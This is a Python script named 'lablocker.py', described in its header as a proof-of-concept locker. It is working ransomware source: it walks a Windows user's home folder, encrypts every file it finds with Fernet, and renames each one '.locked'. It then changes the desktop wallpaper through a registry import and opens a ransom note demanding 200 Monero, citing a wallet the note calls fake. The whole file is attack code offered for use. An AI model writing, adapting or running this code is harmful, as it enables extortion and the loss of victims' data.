#
# lablocker.py - idchoppers
#
# REQUIRES:
# - Python3
# - cryptography
# |- cffi
# \- pycparser
#
# A simple locker and encryptor. More of a proof of concept really.
# Iterates through a dirtree and encrypts all the files in it,
# Doesn't need Admin privs as long as the user running it is targeting
# files that they own, and the keyfile is being genned somewhere they own.
#
# Usage: lablocker.py <<Username>>
# Or instead of argv, you can mod this to a specific target

import time
import os
import ntpath
import sys
from cryptography.fernet import Fernet

fileList = []
user = sys.argv[1] # Replace this if you want to hardcode
systemdrive = os.environ['SYSTEMDRIVE']
homepath = systemdrive + "\\Users\\" + user
wallpaper = systemdrive + "\\Windows\\wallpaper.jpg"
keyfile = systemdrive + "\\Windows\\locker.key"
#print(homepath)

def CheckKeyFile(keyfile):
    if os.path.isfile(keyfile) is True:
        exit()

def FindFiles(tree, array):
    for root, dirs, files in os.walk(tree):
        for filename in files:
            file = os.path.join(root, filename)

            for i in filename:
                array.append(file)
                #print(file)
                
def GenKeyFile(keyfile):
    key = Fernet.generate_key()
    with open(keyfile, "wb") as kf:
        kf.write(key)

def EncryptFile(file, keyfile):
    with open(keyfile, "rb") as kf:
        for data in kf:
            fernet = Fernet(data)
            
    try:
        with open(file, "rb") as f:
            original = f.read()

        encrypted = fernet.encrypt(original)

        with open(file, "wb") as ef:
            ef.write(encrypted)
        
        os.rename(file, file+".locked")
            
    except:
        pass
        #print("File " +file+ " failed to encrypt")

def GenLockerNote(path):
    with open(path, "wt") as f:
        f.write("\n"+
"         $$$$$$\n"+
"        $$$$$$$$\n"+
"      $$$      $$$\n"+
"     $$$        $$$\n"+
"     $$$        $$$\n"+
"  $$$$$$$$$$$$$$$$$$$$\n"+
" $$$$$$$$$$$$$$$$$$$$$$\n"+
"$$$$                $$$$\n"+
"$$$$      $$$       $$$$\n"+
"$$$$     $$$$$      $$$$\n"+
"$$$$     $$$$$      $$$$\n"+
"$$$$      $$$       $$$$\n"+
"$$$$      $$$       $$$$\n"+
"$$$$                $$$$\n"+
" $$$$$$$$$$$$$$$$$$$$$$\n"+
"  $$$$$$$$$$$$$$$$$$$$\n"+
"\n"+
"#========================#\n"+
"#Your files are locked!!!#\n"+
"#========================#\n"+
"\n"+
"Don't worry though, if you want to recover your data, follow the instructions below:\n"+
"\n"+
"You will need to send a payment to the below wallet address to decrypt your files.\n"+
"(If you want to know how much that is in USD, you should look up Monero to USD in \n"+
"your web browser, the price fluctuates every so often) \n"+
"\n"+
"===============================================================================================\n"+
"Price: 200 XMR\n"+
"Wallet Address:\n"+
"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge\n"+
"Note: This is not a real address, good luck! (^_^)\n"+
"===============================================================================================\n"+
  "")
        f.close()
    time.sleep(5)
    os.system("notepad.exe " + path)

def SetWallpaper(filename):
    os.system("copy " + filename + " " + wallpaper)
    time.sleep(1)
    os.system("reg import wallpaper.reg")
    time.sleep(1)

CheckKeyFile(keyfile)
#print("Checked for keyfile")

FindFiles(homepath, fileList)
#print("Found fileList")

fileList = list(dict.fromkeys(fileList)) # Remove duplicate entries
#print(fileList)
#print("Built fileList")

GenKeyFile(keyfile)
#print("Generated keyfile")

for file in fileList:
    EncryptFile(file, keyfile)
#print("Encrypted files")

SetWallpaper("wallpaper.jpg")
#print("Set wallpaper")

GenLockerNote(homepath+"\\Desktop\\HowToRecoverYourFiles.txt")
#print("Opened note")
